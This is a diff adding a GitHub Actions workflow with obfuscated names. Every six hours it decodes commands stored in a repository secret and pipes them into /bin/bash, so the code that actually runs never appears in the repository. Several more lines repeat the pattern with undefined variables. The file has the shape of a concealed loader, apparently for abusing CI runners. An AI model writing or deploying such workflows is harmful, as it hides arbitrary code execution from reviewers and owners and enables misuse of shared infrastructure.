@@ -1,0 +1,24 @@
+name: jianglongshen6745
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jianglongshen6745
+        env:
+          if68608: ${{ secrets.if68608 }}
+        run: |
+          echo $if68608 | jq -r .dblv3 | /bin/bash
+          echo $r3206 | jq -r .bh018 | /bin/bash
+          echo $cgw18294 | jq -r .ofw884 | /bin/bash
+          echo $r4149 | jq -r .whm2457 | /bin/bash
+          echo $qbycq14 | jq -r .nrhgw721 | /bin/bash
+          echo $pzfu302 | jq -r .cd1028 | /bin/bash
+          echo $ctgk4 | jq -r .h9146 | /bin/bash
+
